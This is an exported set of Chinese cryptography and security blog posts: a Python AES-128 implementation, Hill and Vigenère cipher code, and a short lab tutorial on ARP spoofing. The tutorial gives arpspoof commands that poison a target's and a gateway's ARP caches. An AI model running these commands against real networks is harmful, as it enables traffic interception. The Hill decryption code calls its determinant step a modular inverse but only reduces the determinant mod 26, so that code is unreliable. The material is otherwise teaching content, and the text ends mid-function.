[{"id":"ef3be98fdaf42e277f90b9a43c3896d0","title":"密码学编程之AES加解密","content":"密码学编程之AES加解密1.AES加解密原理这一篇博客具体细节比较向详细：https://blog.csdn.net/jiamisoft/article/details/125783821\n​    AES是作为DES的替代标准出现的。AES明文分组长度为128位，即16个字节，密钥长度可以为16个字节、24个字节、或32个字节，即128位密钥、192位密钥、或256位密钥。AES中没有使用Feistel网络，其结构为SP结构。\n128位密钥加密结构示意图：\n\n(1)字节代换：AES的字节代换操作可以简化为查表操作(本质基于一定的数学原理，之后再来填坑)\n初始输入128bit(16字节)数据，可以看成4*4的字节矩阵，把每一个字节通过查表替换成对应字节\n(2)行位移：对于4*4的矩阵，操作为：第0行：保持不动；第1行：循环左移1个字节；第2行：循环左移2个字节；第3行：循环左移3个字节。\n(3)列混淆：实际上为4*4矩阵左边乘上一个固定矩阵\n要注意的是这里矩阵元素的乘法和加法是定义在GF(2^8)上的二元运算，加法相当于异或，乘法比较复杂。(有时间再写)\n(4)轮密钥加：轮密钥与状态矩阵进行逐比特异或操作\n(5)密钥拓展:密钥是128bit,但要进行11次的轮密钥加，要用初始输入密钥生成后10个密钥\n原理如下图：\n\n2.加解密实现代码 AES_128.py基本的输入格式有点怪，懒得改了，希望之后有时间写一版中间字节存储，输入16进制的，但写了一些格式转换函数，通过StrToBinList()函数能将字符串能改成我写的这种输入格式的(不熟悉这样的编程，不知道什么格式处理的最方便就怪起来了)。\n#输入为128bit(01二进制串)  [&#39;01100011011010000110111101101110&#39;, &#39;01100111011110010110000101101110&#39;, &#39;01101001011100110111100101111001&#39;, &#39;01100100011100110000000000000000&#39;]\nimport numpy as np\nimport base64 \n\nSubchart &#x3D; [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,\n\t\t        0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,\n\t\t        0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,\n\t\t        0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,\n\t\t        0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,\n\t\t        0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,\n\t\t        0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,\n\t\t        0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,\n\t\t        0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,\n\t\t        0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,\n\t\t        0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,\n\t\t        0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,\n\t\t        0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,\n\t\t        0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,\n\t\t        0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,\n\t\t        0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16]\n\ndef StreamListToMix(SL):\n\tmix&#x3D;np.zeros((4,4),dtype&#x3D;int)\n\tfor i in range(4):\n\t\ttmp&#x3D;SL[i]\n\t\tfor j in range(4):\n\t\t\tmix[j][i]&#x3D;int(tmp[8*j:8*j+8],2)\n\n\treturn mix\n\n&#39;&#39;&#39;\nStreamListToMix(SL) 的返回值形如\n[[251 133 249  67]\n [ 69 182 143 143]\n [168 239 182  99]\n [159 159 182  99]]\n&#39;&#39;&#39;\n\ndef SubByte(mix):\n\t#字节替换\n\n\n\tfor i in range(4):\n\t\tfor j in range(4):\n\t\t\ttmp&#x3D;bin(mix[i][j])[2:].zfill(8)  #tmp&#x3D;01100011(格式)\n\t\t\tx&#x3D;int(tmp[:4],2)  #行数 6\n\t\t\ty&#x3D;int(tmp[4:],2)  #列数 3\n\t\t\tmix[i][j]&#x3D;Subchart[16*x+y] #查表替换 0xfb,但会自动保存为10进制 251\n\n\treturn mix\n&#39;&#39;&#39;\nSubByte(mix)的返回值形如\n[[251 133 249  67]\n [ 69 182 143 143]\n [168 239 182  99]\n [159 159 182  99]]\n&#39;&#39;&#39;\n\ndef RotHang(mix):\n\t#行位移\n\tres_mix&#x3D;np.zeros((4,4),dtype&#x3D;int)\n\tres_mix[0]&#x3D;mix[0]\n\tres_mix[1]&#x3D;np.roll(mix[1],-1)\n\tres_mix[2]&#x3D;np.roll(mix[2],-2)\n\tres_mix[3]&#x3D;np.roll(mix[3],-3)\n\n\treturn res_mix\n\n&#39;&#39;&#39;\nRotHang(mix)的返回值形如\n[[251 133 249  67]\n [182 143 143  69]\n [182  99 168 239]\n [ 99 159 159 182]]\n&#39;&#39;&#39;\n\ndef mul(a,b):\n\tif a&#x3D;&#x3D;0x01:\n\t\treturn b         #乘上上1，值不变\n\telif a&#x3D;&#x3D;0x02:\n\t\tif b&amp;128!&#x3D;128:\n\t\t\treturn b&lt;&lt;1\n\t\telse:\n\t\t\ttmp&#x3D;(b&lt;&lt;1)-256\n\t\t\treturn tmp^0x1b    #与上10000000，判断最高位是否为1，不为1直接左移一位\n\telif a&#x3D;&#x3D;0x03:\n\t\treturn mul(0x02,b)^b\n\telif a&#x3D;&#x3D;0x09:\n\t\treturn mul(0x02,mul(0x02,mul(0x02,b)))^b\n\telif a&#x3D;&#x3D;0x0b:\n\t\treturn mul(0x09,b)^mul(0x02,b)\n\telif a&#x3D;&#x3D;0x0d:\n\t\treturn mul(0x02,mul(0x02,mul(0x02,b)))^mul(0x02,mul(0x02,b))^b\n\telif a&#x3D;&#x3D;0x0e:\n\t\treturn mul(0x0d,b)^mul(0x03,b)\n\n\ndef ColMix(mix):\n#列混淆\n\tCM_B&#x3D;[[0x02, 0x03, 0x01, 0x01],\n\t\t[0x01, 0x02, 0x03, 0x01],\n\t\t[0x01, 0x01, 0x02, 0x03],\n\t\t[0x03, 0x01, 0x01, 0x02]]\n\n\tz_array&#x3D;np.zeros((4,4),dtype&#x3D;int)\n\tfor j in range(4):\n\t\tfor q in range(4):\n\t\t\tfor k in range(4):\n\t\t\t\tz_array[j][q]^&#x3D;mul(CM_B[j][k],mix[k][q])\n\n\t#print(z_array)\n\treturn z_array\n\n&#39;&#39;&#39;\nColMix(mix)的返回值形如\n[[ 21 160  99  12]\n [ 13  71 139 128]\n [ 79  76 192 175]\n [222 232  94 239]]\n&#39;&#39;&#39;\n\n\n\ndef RoundKeyAdd(mix_m,mix_k):\n\tres_mix&#x3D;mix_m^mix_k\n\treturn res_mix\n\n\ndef T_SubByte(s):\n\t#字节替换\n\n\ta&#x3D;[] #放置代换后的四个字节对应的16进制\n\t#b&#x3D;[] #放置代换后的四个字节对应的2进制\n\t#print(&#39;s:%s&#39;%s)\n\tfor i in range(4):\n\t\ttmp&#x3D;s[i*8:i*8+8]\n\t\t#print(tmp)\n\t\tx&#x3D;int(tmp[:4],2)  \n\t\t#print(&#39;0b&#39;+tmp[4:])\n\t\ty&#x3D;int(tmp[4:],2)  #2进制转10进制得到行列数 1100001011111011011111100\n\t\t#print(y)\n\t\t#b.append(bin(int(Subchart[x*16+y]))[2:].zfill(8))  #2进制(不加0b)\n\t\ta.append(Subchart[x*16+y])          #16进制(加0x) X  其实储存为10进制了\n\n\t#print(a)\n\n\treturn a\n\ndef RotByte(word):\n\t#字循环： 循环左移一个字节\n\treturn word[8:16]+word[16:24]+word[24:32]+word[0:8]\n\ndef T(w,j): #w为上一组128bit密钥的最后一个字，j为轮次\n\t#T函数\n\tRcon&#x3D;[0x01,0x02,0x04,0x08,0x10,   #轮常量\n\t\t  0x20,0x40,0x80,0x1b,0x36]\n\n\t#第一步：字循环\n\ttmp&#x3D;RotByte(w)\n\t#print(tmp)\n\n\t#第二步字节代换\n\ttmp_2&#x3D;T_SubByte(tmp)\n\t#print(tmp_2)\n\t#第三步轮密钥异或\n\ttmp_3&#x3D;tmp_2[0]^Rcon[j]\n\ttmp_2[0]&#x3D;tmp_3   #tmp_2 形如 [17, 68, 41, 219]\n\n\tResult&#x3D;&#39;&#39;        #将tmp_2转成2进制串\n\n\tfor i in range(4):\n\t\tb_2&#x3D;bin(tmp_2[i])[2:].zfill(8)\n\t\tResult&#x3D;Result+b_2        \n\n\treturn Result\n\ndef WordExp(key):\n#密钥拓展\n\tWords&#x3D;[]\n\tWords.append(key)\n\n\t#print(Words)\n\tfor i in range(10):\n\t\tword&#x3D;[]\n\t\ttmp&#x3D;T(Words[i][3],i)\n\t\t#print(tmp)\n\t\ttmp&#x3D;eval(&#39;0b&#39;+Words[i][0])^eval(&#39;0b&#39;+tmp)\n\t\tword.append(tmp)\n\t\tfor j in range(3):\n\t\t\tword.append(word[j]^eval(&#39;0b&#39;+Words[i][j+1]))\n\t\t#print(word)\n\t\tfor s in range(4):\n\t\t\tword[s]&#x3D;bin(word[s])[2:].zfill(32)\n\t\t\t\n\t\tWords.append(word)\n\t\n\treturn Words\n\ndef encrypt(message,key):\n\tmix&#x3D;message\n\t#mix&#x3D;StreamListToMix(message)\n\tWords&#x3D;WordExp(key)\n\n\t#轮密钥加\n\tw_mix_1&#x3D;StreamListToMix(Words[0])\n\tResult_1&#x3D;RoundKeyAdd(mix,w_mix_1)\n\tfor i in range(9):\n\t\t#字节代换\n\t\t#print(Result_1)\n\t\tResult_2&#x3D;SubByte(Result_1)\n\t\t#行位移\n\t\tResult_2&#x3D;RotHang(Result_2)\n\t\t#print(Result_2)\n\t\t#列混淆\n\t\tResult_2&#x3D;ColMix(Result_2)\n\t\t#print(Result_2)\n\t\t#轮密钥加\n\t\tw_mix_i&#x3D;StreamListToMix(Words[i+1])\n\t\tResult_1&#x3D;RoundKeyAdd(Result_2,w_mix_i)\n\t\t#print(Result_1)\n\t#第10轮\n\tw_mix_11&#x3D;StreamListToMix(Words[10])\n\t#字节代换\n\tResult_2&#x3D;SubByte(Result_1)\n\t#行位移\n\tResult_2&#x3D;RotHang(Result_2)\n\t#print(Result_2)\n\t#轮密钥加\n\tResult_1&#x3D;RoundKeyAdd(Result_2,w_mix_11)\n\n\n\treturn Result_1\n\ndef ReSubByte(mix):\n\t#逆字节替换\n\tReSubchart &#x3D; [0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7,0xfb,\n\t\t\t\t0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9,0xcb,\n\t\t\t\t0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3,0x4e,\n\t\t\t\t0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1,0x25,\n\t\t\t\t0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6,0x92,\n\t\t\t\t0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d,0x84,\n\t\t\t\t0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45,0x06,\n\t\t\t\t0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a,0x6b,\n\t\t\t\t0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6,0x73,\n\t\t\t\t0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf,0x6e,\n\t\t\t\t0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe,0x1b,\n\t\t\t\t0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a,0xf4,\n\t\t\t\t0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec,0x5f,\n\t\t\t\t0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c,0xef,\n\t\t\t\t0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99,0x61,\n\t\t\t\t0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c,0x7d]\n\n\tfor i in range(4):\n\t\tfor j in range(4):\n\t\t\ttmp&#x3D;bin(mix[i][j])[2:].zfill(8)  #tmp&#x3D;01100011(格式)\n\t\t\tx&#x3D;int(tmp[:4],2)  #行数 6\n\t\t\ty&#x3D;int(tmp[4:],2)  #列数 3\n\t\t\tmix[i][j]&#x3D;ReSubchart[16*x+y] #查表替换 0xfb,但会自动保存为10进制 251\n\n\t\n\treturn mix\n\ndef ReRotHang(mix):\n\t#逆行位移\n\tres_mix&#x3D;np.zeros((4,4),dtype&#x3D;int)\n\tres_mix[0]&#x3D;mix[0]\n\tres_mix[1]&#x3D;np.roll(mix[1],1)\n\tres_mix[2]&#x3D;np.roll(mix[2],2)\n\tres_mix[3]&#x3D;np.roll(mix[3],3)\n\n\treturn res_mix\n\ndef ReColMix(mix):\n#列混淆\n\tCM_B&#x3D;[[0x0e, 0x0b, 0x0d, 0x09],\n\t\t[0x09, 0x0e, 0x0b, 0x0d],\n\t\t[0x0d, 0x09, 0x0e, 0x0b],\n\t\t[0x0b, 0x0d, 0x09, 0x0e]]\n\n\tz_array&#x3D;np.zeros((4,4),dtype&#x3D;int)\n\tfor j in range(4):\n\t\tfor q in range(4):\n\t\t\tfor k in range(4):\n\t\t\t\tz_array[j][q]^&#x3D;mul(CM_B[j][k],mix[k][q])\n\n\t&#39;&#39;&#39;mix_2&#x3D;&#39;&#39;\n\t\t\t\tfor i in range(4):\n\t\t\t\t\tfor j in range(4):\n\t\t\t\t\t\tmix_2&#x3D;mix_2+str(hex(z_array[j][i]))\n\t\t\t\tprint(mix_2)&#39;&#39;&#39;\n\n\treturn z_array\n\n\ndef decrypt(message,key):\n\t#mix&#x3D;StreamListToMix(message)\n\tmix&#x3D;message\n\tWords&#x3D;WordExp(key)\n\tWords.reverse()\n\t#print(Words)\n\t#轮密钥加\n\tw_mix_1&#x3D;StreamListToMix(Words[0])\n\tResult_1&#x3D;RoundKeyAdd(mix,w_mix_1)\n\tfor i in range(9):\n\t\t#字节代换\n\t\t#print(Result_1)\n\t\tResult_2&#x3D;ReSubByte(Result_1)\n\t\t#行位移\n\t\tResult_2&#x3D;ReRotHang(Result_2)\n\t\t#print(Result_2)\n\t\t\n\t\t#列混淆\n\t\tResult_2&#x3D;ReColMix(Result_2)\n\t\t#print(Result_2)\n\t\t#轮密钥加\n\t\tw_mix_i&#x3D;ReColMix(StreamListToMix(Words[i+1]))\n\t\t#print(w_mix_i)\n\t\tResult_1&#x3D;RoundKeyAdd(Result_2,w_mix_i)\n\t\t#print(Result_1)\n\t#第10轮\n\tw_mix_11&#x3D;StreamListToMix(Words[10])\n\t#字节代换\n\tResult_2&#x3D;ReSubByte(Result_1)\n\t#行位移\n\tResult_2&#x3D;ReRotHang(Result_2)\n\t#print(Result_2)\n\t#轮密钥加\n\tResult_1&#x3D;RoundKeyAdd(Result_2,w_mix_11)\n\n\n\treturn Result_1\n\ndef MixToHexStream(mix):  #返回128bit的16进制流\n\tHS&#x3D;&#39;&#39;\n\tfor i in range(4):\n\t\tfor j in range(4):\n\t\t\tHS+&#x3D;hex(mix[j][i])[2:]\n\n\treturn HS\n\ndef MixToStr(mix): #返回128bit的字符串\n\tres_str&#x3D;&#39;&#39;\n\tfor i in range(4):\n\t\tfor j in range(4):\n\t\t\tres_str+&#x3D;chr(mix[j][i])\n\n\treturn res_str\n\ndef StrToBase64(str1):\n\tb &#x3D; base64.b64encode(str1.encode(&#39;latin&#39;)).decode(&#39;latin&#39;)\n\treturn b\n\ndef Base64ToStr(b):\n\tc &#x3D; base64.b64decode(b.encode(&#39;latin&#39;)).decode(&quot;latin&quot;)\n\treturn c\n\ndef HexStreamToBinList(HS):\n\tP&#x3D;[]\n\tnum_2&#x3D;&#39;&#39;\n\tfor s in HS:\n\t\tb&#x3D;bin(int(s,16))[2:].zfill(4)\n\t\tnum_2+&#x3D;b\n\n\twhile len(num_2) % 128 !&#x3D; 0:\n\t\tnum_2 +&#x3D; &#39;0&#39;                      #不够填充0\n\tprint(num_2)\n\tfor i in range(len(num_2)&#x2F;&#x2F;32):     #按照32bit分组\n\t\tP.append(num_2[i*32:i*32+32])\n\treturn P\n\ndef StrToBinList(string): #将ASCII字符转位二进制分组流\n\tP&#x3D;[]\n\tnum_2&#x3D;&#39;&#39;\n\tfor s in string:\n\t\tnum_10&#x3D;ord(s)\n\t\tnum_2&#x3D;num_2+bin(num_10)[2:].zfill(8) #zfill方法可以指定字符串位数，前面用0填充\n\n\t#print(num_2)\n\twhile len(num_2) % 128 !&#x3D; 0:\n\t\tnum_2 +&#x3D; &#39;0&#39;                      #不够填充0\n\t#print(num_2)\n\tfor i in range(len(num_2)&#x2F;&#x2F;32):     #按照32bit分组\n\t\tP.append(num_2[i*32:i*32+32])\n\n\treturn P\n\ndef main():\n\t#message&#x3D;HexStreamToBinList(&#39;00112233445566778899aabbccddeeff&#39;)\n\t#key&#x3D;HexStreamToBinList(&#39;2b7e151628aed2a6abf7158809cf4f3c&#39;)\n\t#print(message)\n\t#print(key)\n\tmessage&#x3D;[&#39;01100011011010000110111101101110&#39;, &#39;01100111011110010110000101101110&#39;, &#39;01101001011100110111100101111001&#39;, &#39;01100100011100110000000000000000&#39;]\n\tkey&#x3D;[&#39;11101000111010001100110100110100&#39;, &#39;01101000100010011111100000011111&#39;, &#39;10010000000101010100101100110000&#39;, &#39;10011111111000111000011001001100&#39;]\n\tmix&#x3D;StreamListToMix(message)\n\tprint(mix)\n\t#key_mix&#x3D;StreamListToMix(key)\n\t#print(mix)\n\t#sub_mix&#x3D;SubByte(mix)\n\t#print(sub_mix)\n\t#rot_mix&#x3D;RotHang(sub_mix)\n\t#print(rot_mix)\n\t#col_mix&#x3D;ColMix(mix)\n\t#print(col_mix)\n\t#print(WordExp(key))\n\tc&#x3D;encrypt(mix,key)\n\tprint(c)\n\t#print(MixToStr(c))\n\t#print(MixToHexStream(c))\n\t#print(StrToBase64(MixToStr(c)))\n\tp&#x3D;decrypt(c,key)\n\tprint(p)\n\n\t#c&#x3D;mix(c)\n\t#p&#x3D;decrypt(c,key)\n\t#print(MixToStr(p))\n\n\n&#39;&#39;&#39;\nencrypt(message,key)\n[[ 37 116  19 127]\n [223  19  60 168]\n [210  41   2 236]\n [151 238 108 192]]\n&#39;&#39;&#39;\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n\tmain()\n\n3.运行结果示意图\n初始矩阵状态-》加密得到的矩阵-》解密后的矩阵\n\n","slug":"密码学编程之AES加解密","date":"2022-11-18T08:48:45.000Z","categories_index":"","tags_index":"密码学","author_index":"c1ongyan"},{"id":"350110abdd9efa15378005351b5f698f","title":"实施ARP攻击与欺骗","content":"实施ARP攻击与欺骗1.ARP欺骗原理ARP欺骗通过伪造ARP应答包实施欺骗\n\n2.实施ARP欺骗环境：攻击机：Kali\n靶机：win7 x64\n(1)开启路由转发echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward\n\n(2)查看攻击主机的IP地址和ARP缓存表ip地址：\nifconfig\n\narp缓存表：\narp\n\n(3)查看目标主机的ip地址和ARP缓存表ip地址：\nipconfig\n\narp -a\n\n(4)对目标主机实施arp欺骗arpspoof -i eth0 -t 192.168.83.139 192.168.83.2\n\n\n(5)对网关实施arp欺骗arpspoof -i eth0 -t 192.168.83.2 192.168.83.139 \n\n(6)也可以一条命令同时对目标主机和网关实施arp欺骗arpspoof -i eth0 -t 192.168.83.139 -r 192.168.83.2\n-i 网络接口\n-t 目标主机\n-r 双向欺骗\n","slug":"实施ARP攻击与欺骗","date":"2022-11-05T12:40:42.000Z","categories_index":"","tags_index":"web","author_index":"c1ongyan"},{"id":"10c10619c141e4f3e8af867ca71a0cce","title":"密码学编程之希尔密码加解密","content":"密码学编程之希尔密码加解密1.什么是希尔(Hill)密码Hill密码的基本思想是通过线性变换将n个连续的明文字母替换为n个密文字母。\nHill密码的实质就是通过一个变换矩阵把明文变换为密文的一种密码体制\n2.希尔密码加解密代码import numpy as np\n\nLetters&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;\n\ndef strToArr(string):\n#字符串转成数组\n\tnumList&#x3D;[]\n\tstring&#x3D;string.upper()\n\n\tfor s in string:\n\t\tindex&#x3D;Letters.find(s)\n\t\tnumList.append(index)\n\n\tArray&#x3D;np.array(numList)\n\n\treturn Array\n\ndef ListToStr(List):\n#列表数子为字符\n\tresult&#x3D;&#39;&#39;\n\n\tfor i in List:\n\t\tresult&#x3D;result+Letters[i]\n\n\treturn result\n\t\n\ndef encrypt(message,m,key):\n#Hill加密\n\tresult&#x3D;&#39;&#39; #储存加密后的字符串\n\n\tm_arr&#x3D;strToArr(message)    #将明文变成int型一维数组\n\t#print(m_arr)\n\tm_arr&#x3D;m_arr.reshape(-1,m)  #将数组变成m列的向量\n\t#print(m_arr)\n\tc_arr&#x3D;(np.matmul(m_arr,key))%len(Letters)    #加密\n\n\t#print(c_arr)\n\n\tc_arr&#x3D;c_arr.reshape(-1)  #将结果变为一维数组 \n\tc_arr&#x3D;np.around(c_arr)\n\tc_arr&#x3D;c_arr.astype(int\n\t\t)\n\tc_list&#x3D;c_arr.tolist()    \n\t#print(c_list)\n\tresult&#x3D;ListToStr(c_list)  #将列表中的数字转成对应字母\n\n\treturn result\n\n\ndef decrypt(c,m,key):\n\tk_1&#x3D;np.linalg.inv(key) # 求key的逆矩阵，但由于其不是整数，故通过行列式的乘法逆元乘上伴随矩阵得到整数逆元\n\tk_det&#x3D;np.linalg.det(key) #求key矩阵的行列式\n\tk_det_n&#x3D;k_det%len(Letters) #求行列式模26的乘法逆元 本质上是1&#x2F;|A|\n\tk_2&#x3D;k_1*k_det  #矩阵的逆乘行列式&#x3D;伴随矩阵\n\tk_2&#x3D;np.around(k_2) \n\tk_2&#x3D;k_2.astype(np.int64)#浮点型转int型\n\t#print(k_2.dtype)\n\tk_3&#x3D;k_det_n*k_2%26 #行列式的乘法逆元乘上伴随矩阵得到整数逆元\n\t#_3&#x3D;k_3.astype(np.int)#浮点型转int型\n\t#print(k_3)\n\n\treturn encrypt(c,m,k_3) \n\n\ndef main():\n\tmessage&#x3D;&#39;JIIY&#39;\n\tkey&#x3D;np.array([[8,6,9,5],\n\t\t\t\t[6,9,5,10],\n\t\t\t\t[5,8,4,9],\n\t\t\t\t[10,6,11,4]],dtype&#x3D;int)\n\tm&#x3D;4\n\tc&#x3D;decrypt(message,m,key)\n\tprint(c)\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n\tmain()\n\n\n\n3.运行结果加密：\n\n解密：\n\n","slug":"密码学编程之希尔密码加解密","date":"2022-10-17T08:46:48.000Z","categories_index":"","tags_index":"密码学","author_index":"c1ongyan"},{"id":"7578f0af2d88f971b7e36554470841ec","title":"密码学编程之维吉尼亚解密","content":"密码学编程之维吉尼亚解密1.什么是维吉尼亚密码它是典型的多表代换密码，它的加密过程可以通过查表来表示，密文字母为横列，密钥字母为纵列（可以互换），对应得到的字母为加密后的密文，相当于每个字母都选择了一个偏移值来进行凯撒加密，但为了增强密码的可用性与简洁性，维吉尼亚的密钥采取周期式的密钥，即每隔一个周期用同一张表（即同一偏移）来加密。\n\n示例：\n密钥为：encryption\n明文为：publickeydistribution\n\n2.维吉尼亚解密2.1已知密钥的维吉尼亚解密思路：做加密的逆过程即可。加密是按照密钥进行凯撒加密，解密就是按照密钥进行凯撒解密。\nimport wordninja #wordninja是分词工具\n\nLetters=\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n\ndef decrypt(key,message):\n\n\tresult=''\n\tl=len(key)\n\tj=0\n\n\tfor i in message:\n\t\tindex=(Letters.find(i)-Letters.find(key[j]))%26\n\t\tj=(j+1)%l\n\t\tresult=result+Letters[index]\n\n\ttext=' '.join(wordninja.split(result)) #对解密结果按英文分词，增加可读性\n\n\treturn text\n\n\ndef main():\n\tmessage='krkpewxvftksopztecxvbuhfvycgxouflihoffptrcwffwhkcevxhiuzfposdvccyctpmjtbfymllctiwxtacsmjmoncwdnawjrwtjgjsuystvbxgvcmgczbqecllttfkjlacpfttjgeegtbvkfpmhjzqaxhvvpgxoeychrcwumchhyigixhqdciawunmjerefkekcozqttznfdjlopuyqhjgrjawcpfrgxhwiljgrgiycrqkiajfgvrlrxgkkghdbqnliaovzrltgafslacjvjexrwjrdzsvruprttfkwxfgrlstznnmjerdvjdlhkwwdngjfsawgjfunhitjcaykgrptzicibtwrcpycwbkxfibrqemivotvwdnotvldmvgicshbqkztmfqlzaxrqekntqefscmbqkfxguyzjaaorgccmcovrwxbckgdgonrqhxadcclbznjfdpzgegtgqawygxkgcjiasofqiecxvbdyageztjikvrxymqlapghcbcrtfgfdnhitjcaytqiknlsnwgrtbpfrlkwvvycraqicqnhpfrwbbizliasyfpawqqljslhqgktmccumgxmqlsemcvycsxovy'\n\tkey='CRYPTO'\n\tprint(decrypt(key,message.upper()))\n\nif __name__ == '__main__':\n\tmain()\n2.2唯密文的维吉尼亚解密1.利用重合指数+重合互指数解密此种方法对于唯密文的维吉尼亚解密是基于语言的统计规律，所以当密文很短是是无法用该方法解密的，对长密文比较适用\n思路：\n1.根据kasiski或者重合指数计算出密钥长度\nKasiski测验法基本原理：用给定长度为k的密钥周期性地对明文加密，则但明文中有两个相同的字母，且对应被加密后的字母也相同时，这两个字母的间距是k的倍数。找到密文中相同字母间隔的最大公因数，很有可能是密钥长度。\n重合指数法：对单表替换而已，并不会改变字符串的统计特性（比如，某个英语字母出现的频率），故其重合指数应该约等于0.065。可以爆破密钥长度，根据密钥长度将同一密钥字母加密的字母放在一个分组内，每个分组都相当于被单表替换，都应满足重合指数应该约等于0.065。\n重合指数:两个随机字母相同的概率（即在一字符串中随机取出两个字母为a的概率+同为b的概率+…）\n​                                                            \n（pi为字母i出现频率）\n重合指数无偏估计值(更准确，用此来计算):\n​                                                            \n（fi为字母i出现次数，n为字符串字符总数）\n代码：\ndef getCnt(string):\n#统计字符出现的次数\n\tLettersZd={'A':0, 'B':0, 'C': 0, 'D': 0, 'E': 0, 'F': 0, 'G': 0, 'H': 0, 'I': 0, 'J': 0, 'K': 0, 'L': 0, 'M': 0, 'N': 0, 'O': 0, 'P': 0, 'Q': 0, 'R': 0, 'S': 0, 'T': 0, 'U': 0, 'V': 0, 'W': 0, 'X': 0, 'Y': 0, 'Z': 0}\n\tfor i in string:\n\t\tif i  in LettersZd:\n\t\t\tLettersZd[i]+=1\n\n\treturn LettersZd\n\ndef getIC(Zd):\n#计算重合指数\n\tfi=0\n\tn=0 #总数n\n\tfor k in Zd:\n\t\tfi=fi+Zd[k]*(Zd[k]-1)\n\t\tn=n+Zd[k]\n\n\tp=fi/(n*(n-1))\n\n\treturn p\n\ndef getLenKey(message):\n#得到密钥长度\n#方法：计算子串重合指数\n\tcnt=0\n\tpi=0\n\tfor i in range(1,len(Letters)):\n\t\t#print('key_length=%s'%i)\n\t\tfor j in range(1,i+1):\n\t\t\tstr=message[j::i]\n\t\t\tLettersZd=getCnt(str)\n\n\t\t\tpi=getIC(LettersZd)\n\t\t\t\n\t\t\tif pi&gt;0.055 and pi&lt;0.075:\n\t\t\t\tcnt+=1\n\t\tif cnt==i:\n\t\t\treturn i 